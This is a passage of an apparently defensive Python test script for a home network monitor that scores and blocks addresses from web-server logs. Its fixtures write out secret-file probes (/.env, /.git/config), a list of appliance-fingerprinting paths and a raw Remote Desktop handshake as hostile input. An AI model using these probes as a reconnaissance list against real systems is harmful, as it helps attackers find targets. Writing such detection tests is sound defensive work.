# The owner's own watch, on the mobile network: twenty-odd 504s while the house
# server was slow, then a 403 while a link was being changed.
d.store.note_tap_row = getattr(d.store, 'note_tap_row', None)
with d.store.lock:
    d.store.db.execute('INSERT INTO taps_log (ts, link, what, who, way, state) VALUES (?,?,?,?,?,?)',
                       (time.time() - 3600, 'Garaz', 'on', '89.24.57.142 (a phone)', 'header', 'done'))
d._friends = {}
_watch = ['89.24.57.142 - - [%s] "POST /tap HTTP/2.0" 403 146 "-" "BackgroundShortcutRunner/5037"'
          % _when2(300 - _i * 20) for _i in range(9)]
d.proxy_weigh(_watch)
assert '89.24.57.142' not in [r['ip'] for r in d.blocked_list()], \
    'the address that had pressed a link and been let in was kept out for being refused'
# ...but the same address asking for .env is still asking for .env
d.proxy_weigh(['89.24.57.142 - - [%s] "GET /.env HTTP/1.1" 404 0 "-" "x"' % _when2(100),
               '89.24.57.142 - - [%s] "GET /.git/config HTTP/1.1" 404 0 "-" "x"' % _when2(80)])
assert '89.24.57.142' in [r['ip'] for r in d.blocked_list()], \
    'a friend asking for this machine\'s keys was passed over too'
with d.store.lock:
    d.store.db.execute('DELETE FROM taps_log')
d._friends = {}
d.store.unblock(); d.forget_anomaly()
zigmon.CONFIG['proxy_host'] = ''
print('a caller that pressed a link and was let in is not kept out for a refusal - but is for a key hunt')

# ===== 5.7: what the front server's logs of 23 September - 3 October 2026 showed ===
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_sensitivity': 'normal',
                      'never_block': '', 'block_ladder': '', 'proxy_host': 'p',
                      'block_private': 'gently', 'feeds': ''})
d.store.unblock()
d.forget_anomaly()
d._bursts = {}


def _ntfy_lines(ip, request, status, many, every=0.2, back=600):
    out = []
    for _i in range(many):
        when = time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime(time.time() - back + _i * every))
        out.append('%s - - [%s] "%s" %d 512 "-" "Mozilla/5.0 (Windows NT 10.0) Chrome/152"'
                   % (ip, when, request, status))
    return out


# A page that asks for thirty of its own files the moment it opens is not a
# burst. The notification server's own web app does exactly that, and while
# that server was restarting every one of them came back 502 and the browser
# retried the lot - which is how this house's own browser was kept out of its
# own notifications after forty requests.
d.ntfy_weigh(_ntfy_lines('46.227.172.22', 'GET /static/media/index-Cx1kKwl6.js HTTP/2.0', 200, 30))
d.ntfy_weigh(_ntfy_lines('46.227.172.22', 'GET /settings HTTP/2.0', 502, 40, back=560))
d.ntfy_weigh(_ntfy_lines('46.227.172.22', 'GET /manifest.webmanifest HTTP/2.0', 404, 12, back=520))
assert '46.227.172.22' not in [r['ip'] for r in d.blocked_list()], \
    'a browser loading the web app, and a server of ours answering 502, kept the house out'
_watched = [x for x in d.anomaly_state() if x['ip'] == '46.227.172.22']
assert not _watched or _watched[0]['score'] < 8, \
    'the house\'s own browser is on its way to being kept out: %r' % (_watched and _watched[0]['score'],)
d.forget_anomaly('46.227.172.22')
d._bursts = {}
print('a page loading, and a server of ours failing, are not somebody hammering')

# ...and a burst of REFUSALS still is. Forty requests the front server turned
# away, in a few seconds, from one address.
d.ntfy_weigh(_ntfy_lines('45.9.200.11', 'GET / HTTP/1.1', 444, 44, every=0.15, back=400))
assert '45.9.200.11' in [r['ip'] for r in d.blocked_list()], \
    'forty-four refusals in seven seconds were not read as hammering'
d.store.unblock('45.9.200.11')
d.forget_anomaly('45.9.200.11')
d._bursts = {}
print('a burst of refusals is still the hammering it was')

# Working out WHAT this machine is: the one file an appliance answers to, at
# a name this machine does not carry. Four of these used to weigh as four
# people mistyping an address, and the rounds they belong to took seventeen
# requests to stop.
_was_same, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0


def _probe(ip, request, status, many=1):
    """What one shape of request from one address is worth, and whether it
    ends with that address being kept out. (The same as _shape above, under a
    name of its own: a loop between the two took that one for a word.)"""
    d.store.unblock(ip)
    d.forget_anomaly(ip)
    lines = []
    for i in range(many):
        when = time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime(time.time() - 120 + i * 5))
        lines.append('%s - - [%s] "%s" %s 0 "-" "-"' % (ip, when, request, status))
    d.proxy_weigh(lines)
    one = [x for x in d.anomaly_state() if x['ip'] == ip]
    return ((one[0]['score'] if one else 0),
            (one[0]['kinds'][0]['kind'] if one and one[0]['kinds'] else ''),
            any(r['ip'] == ip for r in d.blocked_list()))
for _ip, _req, _status, _many, _kind, _out in (
        ('45.9.201.10', 'GET /dana-cached/hc/HostCheckerInstaller.osx HTTP/1.1', 444, 3,
         'proxy-fingerprint', True),
        ('45.9.201.11', 'GET /RDWeb HTTP/1.1', 444, 3, 'proxy-fingerprint', True),
        ('45.9.201.12', 'GET /wsman HTTP/1.1', 444, 3, 'proxy-fingerprint', True),
        ('45.9.201.13', 'GET /owa HTTP/1.1', 444, 3, 'proxy-fingerprint', True),
        ('45.9.201.14', 'GET /cgi-bin/authLogin.cgi HTTP/1.1', 404, 3, 'proxy-fingerprint', True),
        ('45.9.201.15', 'GET /ext-js/app/common/zld_product_spec.js HTTP/1.1', 444, 3,
         'proxy-fingerprint', True),
        ('45.9.201.16', 'GET /magento_version HTTP/1.1', 404, 3, 'proxy-fingerprint', True),
        ('45.9.201.17', 'GET /version HTTP/1.1', 444, 3, 'proxy-fingerprint', True),
        ('45.9.201.18', 'GET /officescan/console/html/localization.js HTTP/1.1', 444, 3,
         'proxy-fingerprint', True),
        ('45.9.201.19', 'GET /favicon-abe32304.png HTTP/1.1', 404, 3, 'proxy-fingerprint', True),
        # ...and two of them is still not a round: nobody loses their address
        # for asking what this machine is, twice
        ('45.9.202.20', 'GET /webui HTTP/1.1', 444, 2, 'proxy-fingerprint', False)):
    _score, _got, _kept = _probe(_ip, _req, _status, _many)
    assert _got == _kind, '%r was read as %r, not %r' % (_req[:40], _got, _kind)
    assert _kept == _out, '%r %s kept out' % (_req[:40], 'was' if _kept else 'was not')
# What this house actually serves is the house's own, however product-shaped
# the name is: the notification server's own favicon lives under /static.
_score, _got, _kept = _probe('45.9.202.21', 'GET /static/images/favicon.ico HTTP/2.0', 200, 6)
assert _score == 0 and not _kept, \
    'the web app\'s own icon, answered, was read as somebody fingerprinting (%d)' % _score
zigmon.Daemon.SAME_TRY_WITHIN = _was_same
print('a round that works out what this machine is: 10 shape(s), and what we serve is ours')

# ...and forty-five asks for the same appliance page are the one thing they
# are, not forty-five things
d.store.unblock()
d.forget_anomaly()
d._bursts = {}
_same = ['45.9.203.9 - - [%s] "GET /auth.html HTTP/1.1" 444 0 "-" "-"'
         % time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime(time.time() - 300))
         for _ in range(45)]
d.proxy_weigh(_same)
_one = [x for x in d.anomaly_state() if x['ip'] == '45.9.203.9']
_kinds = {k['kind']: k['n'] for k in (_one[0]['kinds'] if _one else [])}
assert _kinds.get('proxy-fingerprint', 0) <= 3, \
    'the same page asked for forty-five times was counted %d time(s)' % _kinds.get('proxy-fingerprint', 0)
assert _kinds.get('proxy-hammering', 0) >= 1, 'forty-five in one second was not read as hammering'
d.store.unblock()
d.forget_anomaly()
print('the same appliance page over and over is the one thing it is')

# Bytes that are not a request at all, three times in one second: a Remote
# Desktop handshake at the web port. Every visit was "the same thing again
# within a breath", folded into one, counted once and forgotten by the next
# visit - and four addresses in two neighbouring streets did it three times a
# day for a week without ever being kept out.
d._bursts = {}
_rdp = "\\x03\\x00\\x00,'\\xE0\\x00\\x00\\x00\\x00\\x00Cookie: mstshash=Domain"
_now3 = time.time() - 240
_knock = ['194.165.16.97 - - [%s] "%s" 400 150 "-" "-"'
          % (time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime(_now3)), _rdp) for _ in range(3)]
d.proxy_weigh(_knock)
assert '194.165.16.97' in [r['ip'] for r in d.blocked_list()], \
    'three Remote Desktop handshakes at the web port in one second were counted as one'
# ...and the address next door, doing the same thing minutes later, is one
# tool with two addresses
d.proxy_weigh(['194.165.16.124 - - [%s] "%s" 400 150 "-" "-"'
               % (time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime(_now3 + 60)), _rdp)])
assert '194.165.16.124' in [r['ip'] for r in d.blocked_list()], \
    'the address next door doing the same thing a minute later was not read as one tool'
d.store.unblock()
d.forget_anomaly()
d._bursts = {}
zigmon.CONFIG['proxy_host'] = ''
print('bytes that are not a request at all are counted every time, and next door counts too')

# ============================================================================
# 5.11: the clock in a log belongs to whoever wrote it
# ============================================================================
# The offset nginx writes - "+0200" - was cut off and the rest read as this
# machine's local time. Two machines need not share a zone: a daemon in UTC
# reading a log written +0200 saw every fresh line as two hours in the future,
# threw it away as not sensible, and so counted nothing at all - no bursts, no
# sweeps, nothing kept out. The other way round the lines were filed hours in
# the past and the hour-long windows never found them.
import os as _os

_was_tz = _os.environ.get('TZ')


def _in_zone(zone, what):
    _os.environ['TZ'] = zone
    _time.tzset()
    try:
        return what()
    finally:
        if _was_tz is None:
            _os.environ.pop('TZ', None)
        else:
            _os.environ['TZ'] = _was_tz
        _time.tzset()


for _zone in ('UTC', 'Europe/Prague', 'America/Los_Angeles', 'Australia/Sydney'):
    for _offset, _shift in (('+0200', 7200), ('+0000', 0), ('-0700', -25200)):
        def _read(offset=_offset, shift=_shift):
            written = _time.strftime('%d/%b/%Y:%H:%M:%S', _time.gmtime(_time.time() + shift))
            return d._log_moment('%s %s' % (written, offset)), _time.time()
        _got, _now = _in_zone(_zone, _read)
        assert _got is not None, \
            'a line written %s, read in %s, was thrown away as not sensible' % (_offset, _zone)
        assert abs(_got - _now) < 120, \
            'a line written %s, read in %s, is %.0f s out' % (_offset, _zone, _got - _now)
        # ...and the same for the two JSON logs, which carry the offset too

        def _read_iso(offset=_offset, shift=_shift):
            written = _time.strftime('%Y-%m-%dT%H:%M:%S', _time.gmtime(_time.time() + shift))
            return d._iso_moment('%s.123456%s' % (written, offset)), _time.time()
        _got, _now = _in_zone(_zone, _read_iso)
        assert _got is not None, \
            'an eve.json line written %s, read in %s, was thrown away' % (_offset, _zone)
        assert abs(_got - _now) < 120, \
            'an eve.json line written %s, read in %s, is %.0f s out' % (_offset, _zone, _got - _now)
print('a log line is read at the moment its own clock says, in any zone')

# ...and a whole real minute of one address hammering is counted the same in
# every zone, which is what the reading is for
_hammer = ['185.12.59.118 - - [%s +0200] "GET /wp-login.php HTTP/1.1" 404 0 "-" "-"'
           % _time.strftime('%d/%b/%Y:%H:%M:%S', _time.gmtime(_time.time() + 7200 - _n))
           for _n in range(120)]
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'proxy_host': 'p',
                      'proxy_log': '/var/log/nginx/zigmon-tap.log', 'never_block': ''})
for _zone in ('UTC', 'Europe/Prague'):
    def _weigh():
        d.store.unblock()
        d.forget_anomaly()
        d._bursts = {}
        return sum(1 for one in _hammer if d._log_moment(
            re.search(r'\[([^\]]+)\]', one).group(1)) is not None)
    _moments = _in_zone(_zone, _weigh)
    assert _moments == len(_hammer), \
        'in %s only %d of %d lines of one real minute had a moment at all' \
        % (_zone, _moments, len(_hammer))
d.store.unblock()
d.forget_anomaly()
d._bursts = {}
zigmon.CONFIG['proxy_host'] = ''
print('a minute of one address hammering is counted the same in every zone')

# -- the country list holds off when it cannot be fetched -----------------------
# The moment is written down only when a fetch works, and this is asked every
# thirty seconds by the clock - so a list that could not be fetched was tried
# two thousand eight hundred times a day, two sixty-megabyte downloads each
# time, a warning in the log each time.
import urllib.request

zigmon.CONFIG['geo'] = 1
d.store.set_meta('geo_at', '0')
d.store.set_meta('geo_wait', '')
d.store.set_meta('geo_tries', '0')
_asked = []
_real_open = urllib.request.urlopen


def _no_dns(req, *a, **k):
    _asked.append(getattr(req, 'full_url', str(req)))
    raise OSError('no DNS')


urllib.request.urlopen = _no_dns
try:
    for _ in range(5):
        d.geo_due()
finally:
    urllib.request.urlopen = _real_open
assert len(_asked) <= 2, \
    'five rounds with no DNS made %d outbound request(s) for the country list' % len(_asked)
_held = float(d.store.get_meta('geo_wait') or 0) - _time.time()
assert 600 < _held <= 86400, 'the country list holds off for %.0f s after a failure' % _held
d.store.set_meta('geo_wait', '')
d.store.set_meta('geo_tries', '0')
zigmon.CONFIG['geo'] = 0
print('a country list that cannot be fetched is not asked for again every half minute')

# -- what was written about a block goes when the block goes -------------------
# The story of an address is in blocked_log and block_events and stays; the
# notes saying why it is on the list NOW outlived the row, so an address
# Suricata flagged once, let back in, and blocked months later for something
# else was shown with the old list name and the old CVE panel.
_IP = '203.0.113.77'
zigmon.CONFIG.update({'blacklist': 1, 'never_block': ''})
d.store.unblock(_IP)
d.store.block(_IP, None, 'Suricata saw a Log4Shell attempt', True, 'suricata')
for _key, _value in (('blocked_feed_', 'firehol1'), ('blocked_ids_', '1'),
                     ('blocked_how_', 'Suricata'),
                     ('ids_about_', json.dumps({'sid': 2400015, 'cve': ['CVE-2021-44228']}))):
    d.store.set_meta(_key + _IP, _value)
_was = [r for r in d.blocked_list() if r['ip'] == _IP][0]
assert _was.get('from_ids') and _was.get('ids'), \
    'the Suricata block does not carry what Suricata said: %r' % (_was,)
_events_before = d.store.db.execute('SELECT COUNT(*) FROM block_events').fetchone()[0]
d.store.unblock(_IP, how='ran out')
assert d.store.db.execute('SELECT COUNT(*) FROM block_events').fetchone()[0] > _events_before, \
    'letting an address back in did not write it down'
# ...and what Suricata knows about the address stays, because the history
# rows read it
assert d.store.get_meta('ids_about_' + _IP), 'the history can no longer say what Suricata saw'
# Now an unrelated block of the same address. Its own account is written
# afresh: September's list name and September's rule belong to September.
zigmon.CONFIG.update({'block_score': 1, 'feeds_ban': 0})
d.maybe_block(_IP, 50, [(50.0, 'proxy-missing', 'a path that is not there')])
_row = [r for r in d.blocked_list() if r['ip'] == _IP][0]
assert 'Suricata' not in str(_row.get('why') or ''), \
    'the new block is not the unrelated one this checks: %r' % _row.get('why')
assert not _row.get('from_feed'), 'a new block says it came from %r' % _row.get('from_feed')
assert not _row.get('from_ids'), 'a new block still says Suricata saw it'
assert not _row.get('ids'), 'a new block carries the old rule and CVE: %r' % (_row.get('ids'),)
assert d.store.get_meta('ids_about_' + _IP), \
    'blocking the address again threw away what the history reads'
d.store.unblock(_IP)
d.forget_anomaly()
print('a new block is written with its own account; the history keeps what it reads')

# -- never kept out, written the way people write it ---------------------------
# Anything that was not a bare address or a CIDR was kept as written and
# compared to an address as a string, which no address can ever equal: a
# spared office or monitoring address was on the list, did nothing, and said
# nothing - and being neither the house's own nor spared, it could be blocked
# and was sent to Shodan.
for _written, _spared, _not in (
        ('192.168.1.10 192.168.1.11', ['192.168.1.10', '192.168.1.11'], ['192.168.1.12']),
        ('192.168.1.*', ['192.168.1.5', '192.168.1.250'], ['192.168.2.5']),
        ('192.168.1.1-192.168.1.20', ['192.168.1.1', '192.168.1.20'], ['192.168.1.21']),
        ('192.168.1.1-20', ['192.168.1.11'], ['192.168.1.21']),
        ('10.0.0.0/8, 1.2.3.4', ['1.2.3.4', '10.9.9.9'], ['11.0.0.1']),
        ('2001:db8::/32', ['2001:db8::1'], ['2001:dba::1'])):
    zigmon.CONFIG['never_block'] = _written
    d._spare_from = None
    d._spare_puzzling = None
    for _one in _spared:
        assert d.spared(_one), 'never-block %r does not spare %s' % (_written, _one)
    for _one in _not:
        assert not d.spared(_one), 'never-block %r spares %s as well' % (_written, _one)
# ...and something that is not an address at all is said out loud rather than
# sitting on the list doing nothing
zigmon.CONFIG['never_block'] = 'office-pc'
d._spare_from = None
d._spare_puzzling = None
assert not d.spared('192.168.1.5'), 'a name on the never-block list spares an address'
assert d._spare_puzzling == ['office-pc'], \
    'nothing was said about an entry that spares nothing: %r' % (d._spare_puzzling,)
zigmon.CONFIG['never_block'] = ''
d._spare_from = None
print('never kept out reads the ways people write it, and says so when it cannot')

# -- a rule that is not in the file is not re-grepped for ever -----------------
# rules_fetch skipped sids it already had, but a sid the grep did not find got
# no row, so it was asked for again on every sweep: one SSH round trip every
# few minutes, indefinitely.
zigmon.CONFIG.update({'suricata_rules': '/etc/suricata/rules/suricata.rules', 'proxy_host': 'p'})
_greps = []
_was_run = d.proxy_run
d.proxy_run = lambda cmd: (_greps.append(cmd) or
                           'alert tcp any any -> any any (msg:"REAL ONE"; sid:111; rev:2;)')
try:
    assert d.rules_fetch([111, 222, 333]) == 1, 'the one real rule was not kept'
    d.rules_fetch([111, 222, 333])
    d.rules_fetch([111, 222, 333])
    assert len(_greps) == 1, \
        'three sweeps for the same missing rules made %d grep(s) over SSH' % len(_greps)
    # ...and a week later it is asked once more, in case the ruleset has it now
    with d.store.lock:
        d.store.db.execute("UPDATE ids_rules SET got_at=? WHERE msg=''",
                           (_time.time() - 8 * 86400,))
        d.store.db.commit()
    d.rules_fetch([111, 222, 333])
    assert len(_greps) == 2, 'a week later the missing rules were not asked for again'
finally:
    d.proxy_run = _was_run
    zigmon.CONFIG['proxy_host'] = ''
print('a rule that is not in the file is asked for once, not every few minutes')
